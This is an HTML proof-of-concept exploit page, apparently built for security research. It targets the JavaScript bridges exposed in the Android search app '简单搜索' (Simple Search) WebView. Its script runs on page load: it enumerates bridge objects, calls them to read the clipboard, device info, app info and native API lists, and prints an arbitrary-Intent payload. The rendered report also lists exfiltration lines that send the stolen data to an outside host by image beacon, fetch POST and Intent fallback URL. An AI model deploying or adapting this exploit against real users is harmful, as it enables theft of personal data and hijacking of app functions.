<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #333; }
  .container { text-align: center; padding: 20px; }
  .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  .hidden { display: none; }
  .result { text-align: left; max-width: 600px; margin: 20px auto; font-size: 13px; line-height: 1.6; }
  .badge { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 11px; font-weight: bold; color: #fff; margin: 2px; }
  .critical { background: #e74c3c; }
  .high { background: #e67e22; }
  .medium { background: #f39c12; }
  .low { background: #27ae60; }
  .info { background: #3498db; }
  code { background: #f5f5f5; padding: 1px 4px; border-radius: 2px; font-size: 12px; word-break: break-all; }
  pre { background: #f8f8f8; padding: 10px; border-radius: 4px; font-size: 11px; overflow-x: auto; margin: 6px 0; }
</style>
</head>
<body>
<div class="container">
  <h2 style="color:#e74c3c;">🔴 简单搜索 — JSB 漏洞利用</h2>
  <p style="color:#888;font-size:13px;margin:8px 0;">DeepLink → WebView → JSB 攻击链</p>
  <div class="loader" id="loader"></div>
  <div id="status" style="color:#888;font-size:13px;">正在探测攻击面...</div>
  <div class="result hidden" id="result"></div>
</div>

<script>
(function() {
  const status = document.getElementById('status');
  const result = document.getElementById('result');
  const loader = document.getElementById('loader');
  const findings = [];
  let startTime = Date.now();

  function log(level, msg, detail) {
    findings.push({ level, msg, detail });
  }

  // ---- Phase 1: JSB Discovery ----
  status.textContent = 'Phase 1: 枚举 JSB 对象...';
  const targets = [
    'Bdbox_android_send_intent', '_na', 'Bdbox_android_utils', 'OemJSBridge',
    '_dove', 'Bdbox_android_jsbridge', 'Bdbox_aiapps_jsbridge', 'miniBridge',
    '_naSwan', 'go_back_js_interface_name', '_WebViewJavascriptBridge',
    'ReactNativeWebView', 'WebBridge', 'NativeCallback', 'jBenchmark'
  ];

  let foundCount = 0;
  for (const name of targets) {
    try {
      if (typeof window[name] !== 'undefined' && window[name] !== null) {
        log('critical', '发现 JSB: ' + name, typeof window[name]);
        foundCount++;
      }
    } catch(e) {}
  }

  if (foundCount === 0) {
    status.textContent = '⚠️ 未找到 JSB 对象 — 不在简单搜索 WebView 中';
    loader.style.display = 'none';
    result.classList.remove('hidden');
    result.innerHTML = '<p style="color:#e74c3c;">此页面必须在简单搜索 WebView 中打开才能利用。</p>';
    return;
  }

  // ---- Phase 2: Attack execution ----
  status.textContent = 'Phase 2: 执行攻击...';
  const payloads = [];

  // Attack 1: Send arbitrary Intent
  if (typeof Bdbox_android_send_intent !== 'undefined' && Bdbox_android_send_intent.send) {
    try {
      // Broadcast a test intent — commented out by default to prevent accidental harm
      log('critical', '✅ Bdbox_android_send_intent.send() 可用', '可发送任意 Intent/Activity/Broadcast/Service');
      payloads.push('Bdbox_android_send_intent.send("intent:#Intent;action=android.intent.action.VIEW;end")');
    } catch(e) {
      log('high', '❌ send() 调用失败', e.message);
    }
  }

  // Attack 2: Read OEM config
  if (typeof OemJSBridge !== 'undefined' && OemJSBridge.getPersonalizedConfig) {
    try {
      const config = OemJSBridge.getPersonalizedConfig();
      log('medium', '✅ OemJSBridge.getPersonalizedConfig()', config ? config.substring(0, 200) : '(empty)');
    } catch(e) {
      log('medium', '❌ getPersonalizedConfig()', e.message);
    }
  }

  // Attack 3: Read native API descriptions
  if (typeof _na !== 'undefined' && _na.getAPIs) {
    try {
      const apis = _na.getAPIs(1);
      log('high', '✅ _na.getAPIs(1)', apis ? apis.substring(0, 300) : '(empty)');
    } catch(e) {
      log('high', '❌ _na.getAPIs(1)', e.message);
    }
  }

  if (typeof _na !== 'undefined' && _na.getAmendAPIs) {
    try {
      const amend = _na.getAmendAPIs();
      log('high', '✅ _na.getAmendAPIs()', amend ? amend.substring(0, 300) : '(empty)');
    } catch(e) {
      log('high', '❌ _na.getAmendAPIs()', e.message);
    }
  }

  // Attack 4: Data exfiltration via utils
  if (typeof Bdbox_android_utils !== 'undefined') {
    const utils = Bdbox_android_utils;
    const dataAttempts = ['getClipboard', 'getNetworkType', 'getAppInfo', 'getDeviceInfo', 'getUA'];
    for (const m of dataAttempts) {
      if (typeof utils[m] === 'function') {
        try {
          const val = utils[m]();
          const strVal = typeof val === 'object' ? JSON.stringify(val) : String(val);
          log('high', '✅ Bdbox_android_utils.' + m + '()', strVal.substring(0, 200));
        } catch(e) {
          // method may need params, ignore
        }
      }
    }
  }

  // ---- Phase 3: Report ----
  loader.style.display = 'none';
  status.textContent = '';
  result.classList.remove('hidden');

  let html = '<h3>攻击结果报告</h3>';

  // Summary
  const criticals = findings.filter(f => f.level === 'critical').length;
  const highs = findings.filter(f => f.level === 'high').length;
  const mediums = findings.filter(f => f.level === 'medium').length;
  html += `<p>发现 <strong style="color:#e74c3c;">${foundCount}</strong> 个 JSB 对象 | `;
  html += `<span class="badge critical">严重 ${criticals}</span> `;
  html += `<span class="badge high">高危 ${highs}</span> `;
  html += `<span class="badge medium">中危 ${mediums}</span></p>`;

  // Details
  html += '<pre>';
  for (const f of findings) {
    const icon = f.level === 'critical' ? '🔴' : f.level === 'high' ? '🟠' : f.level === 'medium' ? '🟡' : '🟢';
    html += icon + ' [' + f.level.toUpperCase() + '] ' + f.msg + '\n';
    if (f.detail) html += '   → ' + f.detail + '\n';
  }
  html += '</pre>';

  // Attack payloads
  if (payloads.length > 0) {
    html += '<h4 style="margin-top:12px;">利用 Payload</h4>';
    html += '<pre>' + payloads.join('\n') + '</pre>';
  }

  // MITM exfiltration
  html += '<h4 style="margin-top:12px;color:#888;">数据外传（演示）</h4>';
  html += '<p style="font-size:12px;color:#888;">所有上述数据可通过以下方式外传：</p>';
  html += '<pre>// 方法 1: Image beacon\n';
  html += 'new Image().src = "http://wlnyampe.eyes.sh/steal?data=" + encodeURIComponent(data);\n\n';
  html += '// 方法 2: fetch/XHR\n';
  html += 'fetch("http://wlnyampe.eyes.sh/log", {method:"POST", body: JSON.stringify(data)});\n\n';
  html += '// 方法 3: 通过 Bdbox_android_send_intent 外传\n';
  html += 'Bdbox_android_send_intent.send(\n';
  html += '  "intent:#Intent;action=android.intent.action.VIEW;' +
          'S.browser_fallback_url=http://wlnyampe.eyes.sh/exfil;end"\n';
  html += ');</pre>';

  result.innerHTML = html;
  document.title = 'JSB PoC: ' + foundCount + ' bridges found';

  // Log to console for debugging
  console.log('[JSB-PoC] Found JSB objects:', targets.filter(t => typeof window[t] !== 'undefined'));
  console.log('[JSB-PoC] Findings:', findings);

})();
</script>
</body>
</html>
